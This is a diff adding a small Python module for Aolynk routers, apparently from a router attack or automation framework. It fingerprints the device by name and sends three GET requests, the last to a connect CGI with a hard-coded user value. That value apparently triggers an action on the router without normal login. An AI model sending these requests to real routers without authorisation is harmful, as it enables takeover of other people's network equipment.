@@ -1,0 +1,17 @@
+"""
+Aolynk
+"""
+
+vendor = 'Aolynk'
+name = 'Aolynk'
+regex = r'(?s).*(Aolynk).*'
+
+# step #1
+get('http://{routerip}/?')
+
+# step #2
+get('http://{routerip}/wc/-d/4/-z/livehttpheaders?')
+
+# step #3
+get('http://{routerip}/cgi-bin/connect.cgi?usr=00220215P000')
+
